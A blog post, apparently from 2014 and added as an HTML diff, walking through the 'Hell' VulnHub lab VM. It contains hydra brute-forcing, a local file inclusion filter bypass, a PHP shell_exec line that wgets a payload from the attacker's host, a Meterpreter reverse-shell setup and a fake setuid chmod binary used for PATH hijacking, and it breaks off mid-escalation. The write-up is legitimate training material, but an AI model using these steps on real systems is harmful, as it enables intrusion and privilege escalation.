@@ -1,0 +1,920 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Hell Walkthrough - FourFourFourFour</title>
+  <meta name="author" content="recrudesce">
+
+  
+  <meta name="description" content="Tweet Hell Walkthrough Jul 17th, 2014 4:17 pm vm's So, Peleus released a vulnerable VM on VulnHub, also known as a &ldquo;boot2root&rdquo;, called &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body >
+  <header role="banner" id="sidebar">
+    <!-- Logo -->
+<aside id="logo" class="clearfix">
+  <div class="clearfix">
+    <a href="/">FourFourFourFour</a>
+  </div>
+</aside>
+
+<ul id="menu">
+
+  <li class="title">
+    <h1 id="title"><a href="/">FourFourFourFour</a></h1>
+  </li>
+
+
+  <li class="subtitle">
+    <h2 id="subtitle">A Feeble Attempt At A Blog.</h2>
+  </li>
+
+  <li class="link">
+    <a href="/about/">about</a>
+  </li>
+
+  <li class="link">
+    <a href="http://twitter.com/recrudesce/">twitter</a>
+  </li>
+
+
+  <li class="link rss">
+    <a href="/atom.xml">rss feed</a>
+  </li>
+</ul>
+
+
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:recrudesce.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+
+<!-- Octopress Love -->
+<aside id="octopress_linkback">
+  <a href="http://octopress.org/">
+    <span class="unicode_square">
+      <span class="unicode_circle">
+        &nbsp;
+      </span>
+    </span>
+    <span class="octopress">Powered by Octopress</span>
+  </a>
+</aside>
+
+  </header>
+  <section id="main">
+    <article class="post">
+  <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough/" data-via="recrudesce" data-counturl="http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough/" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+  
+  <header>
+    
+      <h2 class="entry-title">Hell Walkthrough</h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-07-17T16:17:18+01:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>4:17 pm</span></time>
+		
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>
+  
+</span>
+
+
+        
+      </p>
+    
+  </header>
+
+
+<p>So, <a href="http://netsec.ws">Peleus</a> released a vulnerable VM on <a href="http://www.vulnhub.com">VulnHub</a>, also known as a &ldquo;boot2root&rdquo;, called Hell.</p>
+
+<p>A lot of the techniques in this VM are known to me apart from the very last step. I will go through my thought process for each step and how I managed to go from enumeration to a root shell.</p>
+
+<blockquote>[@0x42424242](https://twitter.com/0x42424242) Finally rooted your fucking VM :P
+> 
+> &#8211; Russ Watts (@recrudesce) [July 16, 2014](https://twitter.com/recrudesce/statuses/489505727887978496)</blockquote>
+
+
+
+
+<!-- more -->
+
+
+<hr />
+
+<h2>Scoping the Joint</h2>
+
+<p>NMAP - the start of any fulfilling enumeration stage.  I ran a simple NMAP scan against the VM, which returned the following results</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# nmap -sS -T4 &ndash;script banner 192.168.0.103</p>
+
+<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-17 19:39 BST
+Nmap scan report for 192.168.0.103
+Host is up (0.00012s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+|<em>banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
+80/tcp  open  http
+111/tcp open  rpcbind
+666/tcp open  doom
+|</em>banner: Welcome to the Admin Panel
+MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)</p>
+
+<p>Nmap done: 1 IP address (1 host up) scanned in 5.20 seconds
+[/plain]</p>
+
+<p>OK, so we have SSH, HTTP and apparently Doom (<a href="http://www.kongregate.com/games/mike_id/doom-1">yay Doom !</a>) servers running. Based on previous experience, port 666 is more likely to be a service that is hidden behind a well known port. I wont go into the details of port 666 nor the service behind it, but lets say it&rsquo;s a distraction and a diversionary tactic - don&rsquo;t go there unless you want to waste time.  Unless you want to waste time, in which case fire up Netcat and go for your life !</p>
+
+<p>Visting the web server in a browser presents a pretty boring page that welcomes us to the server and shows a cartoon.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png" alt="" /></a></p>
+
+<p>This doesn&rsquo;t give us much to go on, therefore let&rsquo;s try out some simple things any pentester should try - let&rsquo;s see if a robots.txt file exists.  Well what do you know&hellip;</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png" alt="" /></a></p>
+
+<p>The /personal/ folder shows a creepy shrine site (this is incidentally the closest I&rsquo;ve ever been to the face of a cow)</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png" alt="" /></a></p>
+
+<p>Yeah, creepy&hellip; The /super_secret_login_path_muhahaha/ folder presents a login page</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png" alt="" /></a></p>
+
+<hr />
+
+<h2>Getting In</h2>
+
+<p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# cewl <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a> -d 1 -m 6 -w password_list.txt -v
+CeWL 5.0 Robin Wood (<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x72;&#x6f;&#x62;&#105;&#x6e;&#x40;&#x64;&#x69;&#x67;&#105;&#x6e;&#x69;&#110;&#106;&#x61;&#x2e;&#111;&#x72;&#x67;">&#114;&#x6f;&#98;&#x69;&#x6e;&#x40;&#100;&#x69;&#103;&#105;&#110;&#x69;&#110;&#x6a;&#97;&#46;&#x6f;&#x72;&#x67;</a>) (www.digininja.org)</p>
+
+<p>Starting at <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a>
+Visiting: <a href="http://192.168.0.103/personal/,">http://192.168.0.103/personal/,</a> got response code 200
+Attribute text found:</p>
+
+<p>Words found</p>
+
+<p>root@pwk:~# john &ndash;wordlist=password_list.txt &ndash;rules &ndash;stdout > password_list-mutated.txt
+words: 4251  time: 0:00:00:00 DONE (Thu Jul 17 20:08:13 2014)  w/s: 47233  current: forever99[/plain]</p>
+
+<p>Now we have a password list, we can use hydra to brute force the login.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# hydra 192.168.0.103 http-form-post &ldquo;/super_secret_login_path_muhahaha/login.php:username=^USER^&amp;password=^PASS^:Login Failed&rdquo; -l jack -P password_list-mutated.txt -t 20 -w 1 -o hydra-http-post-attack.txt
+Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>
+
+<p>[WARNING] the waittime you set is low, this can result in errornous results
+Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2014-07-17 20:10:12
+[DATA] 20 tasks, 1 server, 4251 login tries (l:1/p:4251), ~212 tries per task
+[DATA] attacking service http-post-form on port 80
+[80][www-form] host: 192.168.0.103   login: jack   password: g0tmi1k69
+1 of 1 target successfully completed, 1 valid password found
+Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2014-07-17 20:10:22[/plain]</p>
+
+<p>Success, username <strong>jack</strong>, password <strong>g0tmi1k69</strong> (yes, more creepiness, this Jack guy needs locking up). Using these credentials presents us with a management style interface</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png" alt="" /></a></p>
+
+<p>I won&rsquo;t explain each section, but the two sections we are going to use are Notes and Personal.
+Notes allows us to write arbitrary text to a note.txt file stored in &ldquo;temporary storage&rdquo;, which is assumed to be /tmp as this is usually what people define as temporary storage.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png" alt="hell_009" /></a></p>
+
+<p>Personal presents another login page, which sets a cookie which has an attribute that increases with each failed login.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png" alt="" /></a></p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png" alt="" /></a></p>
+
+<p>When you hit 3 failed logins, the page reverts to the main panel, and adds an error message to the top.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png" alt="hell_015" /></a></p>
+
+<p>On further investigation, the <strong>intruder</strong> attribute of the cookie is set which defines the file that is included at the top of the panel. I wonder if there&rsquo;s a local file inclusion vulnerability there.  I went about editing the cookie to try and include other files on the filesystem.  After a few minutes of frustration, I worked out that the code was filtering any instance of ../ in the include path - however, being the sneaky person I am, I discovered this can be bypassed by using &hellip;.// or &hellip;/./ instead.  Here&rsquo;s /etc/passwd included by setting the <strong>intruder</strong> cookie attribute to &hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png" alt="hell_008" /></a></p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png" alt="" /></a></p>
+
+<p>It looks like the page parses any code (HTML etc) in the included file, therefore we can poison the note.txt file with PHP via the Notes feature, and include it to execute the code.  First, a PHP based reverse staged Meterpreter is created and hosted on an HTTP server.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# msfpayload php/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=443 R > sneaky.txt[/plain]</p>
+
+<p>As we are using a staged payload, a handler is required, therefore one is set up via Metasploit</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]msf > use multi/handler
+msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf exploit(handler) > set lport 443
+lport => 443
+msf exploit(handler) > set lhost 192.168.0.110
+lhost => 192.168.0.110
+msf exploit(handler) > run</p>
+
+<p>[<em>] Started reverse handler on 192.168.0.110:443
+[</em>] Starting the payload handler&hellip;[/plain]</p>
+
+<p>Once the failed login cookie is cleared to allow us to get to features again, the following is added to the note.txt file via the Notes feature, which will download our payload from our HTTP server to the /tmp folder on the host</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]&lt;?php echo shell_exec(&lsquo;wget <a href="http://192.168.0.110/sneaky.txt">http://192.168.0.110/sneaky.txt</a> -O /tmp/sneaky.txt 2>&amp;1&rsquo;);?>[/plain]</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png" alt="hell_011" /></a></p>
+
+<p>Three failed logins are once again performed via the Personal feature to create the cookie, which is modified to include /tmp/note.txt (which includes our download PHP command)</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png" alt="hell_012" /></a></p>
+
+<p>When the main panel page is reloaded, our poisoned note.txt file is included, the PHP is parsed and our payload file is downloaded.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png" alt="hell_013" /></a></p>
+
+<p>We&rsquo;re onto something here !  The cookie is edited once again to include /tmp/sneaky.txt and the panel page reloaded to execute stage 1 of our Meterpreter payload, which makes a connection to our waiting handler.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png" alt="hell_014" /></a></p>
+
+<p>[plain gutter=&ldquo;false&rdquo;][<em>] Sending stage (40551 bytes) to 192.168.0.103
+[</em>] Meterpreter session 1 opened (192.168.0.110:443 -> 192.168.0.103:48153) at 2014-07-17 21:55:37 +0100</p>
+
+<p>meterpreter >[/plain]</p>
+
+<p>Now would be a good time for a party, but there&rsquo;s hacking to do.  Plus I have no cake or balloons.  Or friends. <em><em>whimper</em></em> &hellip; HACKING !!!</p>
+
+<p>The Metepreter session can be used to get a shell, which doesn&rsquo;t seem to be TTY, but we can fix that with a nifty command thanks to <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a> himself (who is presumably hiding from Jack, the creepy so-and-so). The id command shows that we are currently under the context of the www-data user.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]meterpreter > shell
+Process 10279 created.
+Channel 0 created.
+python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
+$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ [/plain]</p>
+
+<p>BAM ! We&rsquo;ve just started the journey.</p>
+
+<p>Catting /etc/passwd gives us a list of users that are potentially useful</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+george:x:1000:1000:george,,,:/home/george:/bin/bash
+jack:x:1001:1001::/home/jack:/bin/sh
+milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
+developers:x:1003:1003::/home/developers:/bin/sh
+bazza:x:1004:1004::/home/bazza:/bin/sh
+oj:x:1005:1005::/home/oj:/bin/sh
+[/plain]</p>
+
+<hr />
+
+<h2>Imagine Jack and Jill, But With Half the Cast Replaced with a Cardboard Cutout of g0tmi1k</h2>
+
+<p>Escalating from the www-data user to the jack user is pretty inconsequential. People who write web sites, especially disturbing ones such as this, will usually not bother to create separate accounts for things such as database logins.</p>
+
+<p>A quick grep on the files in /super_secret_login_path_muhahaha/ for the word &ldquo;password&rdquo; results in the following</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ grep password /var/www/super_secret_login_path_muhahaha/<em>
+index.php:<INPUT name="password" id="password" type="password" value=""/>
+login.php:  $password = mysql_escape_string($_POST[&ldquo;password&rdquo;]);
+login.php:  // mysql_connect(&ldquo;127.0.0.1&rdquo;, &ldquo;Jack&rdquo;, &ldquo;zgcR6mU6pX&rdquo;) or die (&ldquo;Server Error&rdquo;); I&rsquo;ll change this back once development is done. Got sick of typing my password.
+login.php:  $sql = &ldquo;SELECT COUNT(</em>) FROM users WHERE username=&lsquo;$username&rsquo; and password=&lsquo;$password&rsquo;&rdquo;;
+personal.php:<INPUT name="password" id="password" type="password" value=""/>
+[/plain]</p>
+
+<p>Oooh, what do I spy with my little eye ? Could that be Jack&rsquo;s password commented out in login.php ? Let us try this password&hellip;</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ su jack
+Password: zgcR6mU6pX</p>
+
+<p>$ whoami
+jack
+$[/plain]</p>
+
+<p>Well, that was easy. But then the 2nd hurdle usually is - you kinda get cocky after clearing the first one, that the second one is jumped based on pure thrill. Now we get to trip over on every hurdle between us and the finish line. Get the first aid kit ready, we&rsquo;re going to need it.</p>
+
+<hr />
+
+<h2>Got Milk ? Want Any ?</h2>
+
+<p>Poking around Jack&rsquo;s home folder is like walking into a public toilet while bursting for a wee - you don&rsquo;t really want to touch anything, but have to else you&rsquo;re going to have problems.</p>
+
+<p>The first thing that draws my eye is the g0tmi1k_pics folder. It&rsquo;s somewhere you know you don&rsquo;t want to go, but seems to have this strange come-hither vibe about it. It&rsquo;s like a car crash&hellip; gruesome but you can&rsquo;t help but look. So I did. Now I wish I didn&rsquo;t. Exhibit A, and B, and C.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg" alt="1" /></a></p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg" alt="2" /></a></p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg" alt="3" /></a></p>
+
+<p>Yeah&hellip;
+Jack, you&rsquo;re a strange one, I&rsquo;ll give you that. Hang on, I think I can hear the men in white coats knocking. Yup, they&rsquo;re asking for you - shall I tell them you&rsquo;re &ldquo;out&rdquo; ?</p>
+
+<p>So, while Jack might reuse passwords, he&rsquo;s sensible enough to use PGP when sending emails. /var/mail/jack/received contains an email, which is encrypted.</p>
+
+<p>[plain]
+&mdash;&ndash;BEGIN PGP MESSAGE&mdash;&ndash;
+Version: BCPG C# v1.6.1.0</p>
+
+<p>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
+yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
+3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
+7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
+rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
+MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
+9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
+V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
+svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
++oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
+=svWU
+&mdash;&ndash;END PGP MESSAGE&mdash;&ndash;[/plain]</p>
+
+<p>As suspected, Jack uses PGP on the local host, therefore his PGP keys are stored in /home/jack/.pgp, complete with a note giving us a password hint.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ ls -l .pgp
+ls -l .pgp
+total 12
+-rwx&mdash;&mdash; 1 jack jack   39 Jun 18 12:35 note
+-rwx&mdash;&mdash; 1 jack jack 1802 Jun 18 12:20 pgp.priv
+-rwx&mdash;&mdash; 1 jack jack  890 Jun 18 12:24 pgp.pub
+$ cat .pgp/note
+The usual password as with everything.
+$
+[/plain]</p>
+
+<p>We can assume the password is either <strong>g0tmi1k69</strong> or <strong>zgcR6mU6pX</strong>. GPG is installed, so the next logical step is to try and decrypt the email using either of these two passwords and Jack&rsquo;s PGP private key.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ gpg &ndash;import .pgp/pgp.priv
+gpg: key 3F18AB0A: secret key imported
+gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
+gpg: key 3F18AB0A: public key &ldquo;<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x6a;&#x61;&#99;&#107;&#64;&#99;&#111;&#x77;&#x6c;&#x6f;&#118;&#x65;&#114;&#115;&#46;&#99;&#x6f;&#109;">&#106;&#x61;&#99;&#x6b;&#64;&#x63;&#x6f;&#119;&#x6c;&#x6f;&#118;&#x65;&#x72;&#x73;&#x2e;&#x63;&#x6f;&#x6d;</a>&rdquo; imported
+gpg: Total number processed: 1
+gpg:               imported: 1  (RSA: 1)
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+$ gpg -o email.txt /var/mail/jack/received/message.eml</p>
+
+<p>You need a passphrase to unlock the secret key for
+user: &ldquo;<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#106;&#x61;&#99;&#x6b;&#64;&#99;&#x6f;&#119;&#108;&#111;&#118;&#101;&#x72;&#x73;&#x2e;&#99;&#x6f;&#x6d;">&#x6a;&#97;&#99;&#107;&#x40;&#x63;&#111;&#x77;&#108;&#x6f;&#x76;&#101;&#x72;&#115;&#x2e;&#99;&#x6f;&#109;</a>&rdquo;</p>
+
+<p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>
+
+<p>Enter passphrase: g0tmi1k69
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
+      &ldquo;<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x6a;&#x61;&#99;&#107;&#64;&#x63;&#x6f;&#119;&#x6c;&#111;&#118;&#x65;&#114;&#x73;&#x2e;&#x63;&#111;&#x6d;">&#106;&#97;&#x63;&#107;&#x40;&#x63;&#x6f;&#x77;&#x6c;&#111;&#x76;&#x65;&#x72;&#x73;&#x2e;&#x63;&#x6f;&#x6d;</a>&rdquo;
+gpg: WARNING: message was not integrity protected
+$ cat email.txt
+Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>
+
+<p>The password is &lsquo;4J0WWvL5nS&rsquo;
+[/plain]</p>
+
+<p>Thank you, Jack, for being a predictable - yet persistent - weirdo. A quick hop and a skip over to the worryingly named milk_4_life account and we can carry on.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ su milk_4_life
+Password: 4J0WWvL5nS</p>
+
+<p>$ whoami
+milk_4_life
+$ [/plain]</p>
+
+<hr />
+
+<h2>I Want to Play a Game, But No Jigsaws, OK ?!</h2>
+
+<p>The home folder for milk_4_life is pretty sparse, just a binary called &ldquo;game&rdquo;. However, it&rsquo;s owned by the george user, and has the suid attribute set.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]$ ls -l
+total 20
+&mdash;s&ndash;x&ndash;x 1 george      george      5743 Jun 19 18:24 game[/plain]</p>
+
+<p>Running the binary produces the following output, which doesn&rsquo;t tell us much other than it&rsquo;s &ldquo;listening&rdquo;. Like a overly intrusive neighbour.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ ./game
+I&rsquo;m listening[/plain]</p>
+
+<p>Netstat isn&rsquo;t available on this VM, so we have to find another way to obtain listening port information. Thankfully ss saves the day and shows the game binary IS actually listening, on port 1337 - h4x !</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ ss -lp
+State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
+LISTEN      0      50        127.0.0.1:mysql       <em>:</em>
+LISTEN      0      128       :::sunrpc             :::<em>
+LISTEN      0      128       </em>:sunrpc              <em>:</em>
+LISTEN      0      128       :::http               :::<em>
+LISTEN      0      128       :::38035              :::</em>
+LISTEN      0      128       <em>:35380               </em>:<em>
+LISTEN      0      128       :::ssh                :::</em>
+LISTEN      0      128       <em>:ssh                 </em>:<em>
+LISTEN      0      10        </em>:1337                <em>:</em>
+LISTEN      0      20        ::1:smtp              :::<em>
+LISTEN      0      20        127.0.0.1:smtp        </em>:<em>
+LISTEN      0      10        </em>:666                 <em>:</em>[/plain]</p>
+
+<p>Connecting to the port from another session asks us to type &ldquo;START&rdquo; to begin. It&rsquo;s more fun to troll the code, though, by typing something completely different. Did you expect anything less of me ?</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ telnet 127.0.0.1 1337
+Trying 127.0.0.1&hellip;
+Connected to 127.0.0.1.
+Escape character is &lsquo;^]&rsquo;.
+Type &lsquo;START&rsquo; to begin</p>
+
+<p>banana
+No&hellip; START. S-T-A-R-T</p>
+
+<p>Connection closed by foreign host.[/plain]</p>
+
+<p>OK, enough messing around, let&rsquo;s see what this game does. Typing START presents us with a high score, and then math questions that only your high school math teacher would ask you infront of the rest of the class. Needless to say I&rsquo;m not answering any of these correctly !</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ telnet 127.0.0.1 1337
+Trying 127.0.0.1&hellip;
+Connected to 127.0.0.1.
+Escape character is &lsquo;^]&rsquo;.
+Type &lsquo;START&rsquo; to begin</p>
+
+<p>START
+Starting&hellip;</p>
+
+<p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)</p>
+
+<p>Quick what&rsquo;s&hellip; 924 x 541? Umm
+Quick what&rsquo;s&hellip; 982 x 21? No idea
+Quick what&rsquo;s&hellip; 194 x 542? Really ?
+Quick what&rsquo;s&hellip; 679 x 733? WHY WOULD I NEED TO KNOW THIS !?
+Quick what&rsquo;s&hellip; 960 x 248? I give up.
+Quick what&rsquo;s&hellip; 718 x 646? THANKS OBAMA !
+Quick what&rsquo;s&hellip; 162 x 784? ^C
+Connection closed by foreign host[/plain]</p>
+
+<p>Being the competitive person I am, I figured it would be fun to try and beat the score. More than 133723 points in 30 seconds means I have to answer 4457 correct answers a second. I can type quickly, but not that quickly. This requires some scripting - Python to the rescue ! This script connects to the game, reads the question, splits it based on &ldquo; x &rdquo; to get both numbers, performs the multiplication and sends the answer back. Granted I had some help on with this code - thanks c0ne !</p>
+
+<p>[python]</p>
+
+<h1>!/usr/bin/python</h1>
+
+<p>import socket
+import re</p>
+
+<p>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect=s.connect((&lsquo;127.0.0.1&rsquo;,1337)) # hardcoded IP address
+s.recv(1024)
+s.send(&lsquo;START\n&rsquo;) # login procedure
+s.recv(110)
+while True:
+    d = s.recv(200)
+    l = re.findall(r&#8221;Quick what&rsquo;s&hellip; (.*?)\?&ldquo;, d)
+    if not l:
+        print d
+        break
+    (a,b) = l[0].split(&lsquo; x &rsquo;)
+    mul = int(a) * int(b)
+    print str(mul)
+    s.send(str(mul)+&lsquo;\n&rsquo;)</p>
+
+<p>print s.recv(1024)
+s.close()[/python]</p>
+
+<p>Running it produces a sense of authority over our robot overlords - I&rsquo;m gaming the game.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ python gamey3.py
+125451
+150858
+498300
+493353
+60564
+<strong><strong> SNIP </strong></strong>
+174386
+841312
+53636
+Final Score: 412619</p>
+
+<p>!<em>!</em>!<em>!</em>! Congratulations, new high score (412619) !<em>!</em>!<em>!</em>!</p>
+
+<p>I hear the faint sound of chmodding&hellip;&hellip;.[/plain]</p>
+
+<p><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/high_score_320x320.png" alt="high_score_320x320" /></p>
+
+<p>It seems that the binary performs an action when the highscore is beaten. I&rsquo;m not sure what it chmods, but I wonder if we can play this game at it&rsquo;s own game and make it run a bogus binary. There&rsquo;s a distinct possibility the code is relying on the PATH environment variable and just calling system(&ldquo;chmod file&rdquo;) rather than using an absolute path.</p>
+
+<p>So, a bogus chmod binary is created using the following source, compiled, placed in /tmp on the VM and made executable (do I need to show you how to do this ? No ? Good. Saves me the typing.)</p>
+
+<p>[c]#include &lt;stdio.h></p>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;sys/types.h></h1>
+
+<h1>include &lt;unistd.h></h1>
+
+<p>int main()
+{
+ setuid( 1000 );
+ system(&ldquo;id&rdquo;);
+ system( &ldquo;/bin/sh -i&rdquo; );
+}[/c]</p>
+
+<p>The path environment variable is modified to make /tmp the first location checked</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]$ PATH=/tmp:$PATH
+$ export | grep PATH
+export PATH=&lsquo;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&rsquo;
+[/plain]</p>
+
